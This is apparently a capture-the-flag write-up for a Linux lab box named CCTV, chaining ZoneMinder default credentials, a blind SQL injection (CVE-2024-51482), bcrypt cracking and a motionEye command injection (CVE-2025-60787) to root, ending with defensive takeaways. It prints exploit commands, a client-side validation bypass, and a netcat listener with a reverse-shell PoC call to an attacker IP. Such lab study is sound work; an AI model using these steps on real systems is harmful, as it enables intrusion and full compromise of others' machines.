CCTV

Easy Linux ✓ Pwned
Date 2026-05-26
OS Linux — Ubuntu 24.04
Stack ZoneMinder 1.37.63 + motionEye 0.43.1b4
CVEs CVE-2024-51482  ·  CVE-2025-60787

Summary

CCTV is a surveillance-themed box that chains two camera applications:

  1. ZoneMinder 1.37.63 accepts default creds admin:admin; CVE-2024-51482 (blind SQLi) dumps user password hashes. mark's bcrypt hash cracks against rockyou → SSH access.
  2. motionEye 0.43.1b4 is discovered on an internal port. Its admin password hash is stored in plaintext config (and used verbatim as the password). CVE-2025-60787 — a client-side validation bypass leading to command injection — yields a root shell.

Reconnaissance

nmap 10.129.4.31
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Port 80 redirects to cctv.htb (vhost routing), so add it to /etc/hosts:

echo '10.129.4.31  cctv.htb' | sudo tee -a /etc/hosts

The site presents a ZoneMinder login, version 1.37.63 visible on the page.

ZoneMinder — Default Creds & CVE-2024-51482

Always try defaults first: admin:admin works. The admin panel reveals three users (admin, mark, superadmin). ZoneMinder 1.37.63 is vulnerable to CVE-2024-51482, a boolean-based blind SQL injection that extracts data one bit at a time:

python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --users

Cracking & SSH Access

Bcrypt is slow (hashcat mode 3200), but mark's password is in rockyou:

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh mark@cctv.htb     # uid=1000(mark); no sudo

There's an inaccessible /home/sa_mark — a hint that lateral movement is needed before privesc.

Port Forward & Plaintext Credentials

ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
# browse http://127.0.0.1:8765 locally

cat /etc/motioneye/motion.conf
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0

motionEye uses the stored SHA1 hash itself as the login password — paste the hex string directly into the form to authenticate as admin.

RCE — CVE-2025-60787

motionEye writes user-supplied values into the motion daemon config without sanitisation; on restart, the daemon evaluates shell syntax embedded in fields like the image filename template. The browser-side configUiValid check is the only guard — and it runs in your browser:

// browser console (F12)
configUiValid = function() { return true; };

The public PoC automates auth, validation bypass, payload injection, and the restart trigger:

nc -lvnp 4444
python3 CVE-2025-60787.py revshell \
  --url 'http://127.0.0.1:8765' \
  --user 'admin' \
  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
  -i 10.10.14.56 --port 4444

Defensive Takeaways

  • Default credentials are still the #1 quick win. Force a change on first login; never ship factory creds.
  • Client-side validation is UX, not security. Every check must be re-enforced server-side — anything reaching the server can be arbitrary.
  • Internal services are in scope. A loopback-only motionEye was the whole path to root; audit ss -tlnp, not just the external footprint.
  • Config files leak secrets. Don't store credential material in world/group-readable files; use proper secret storage and strong, salted hashing.
  • Version disclosure + CVE lookup is a reliable attack path — keep components patched and hide versions where you can.
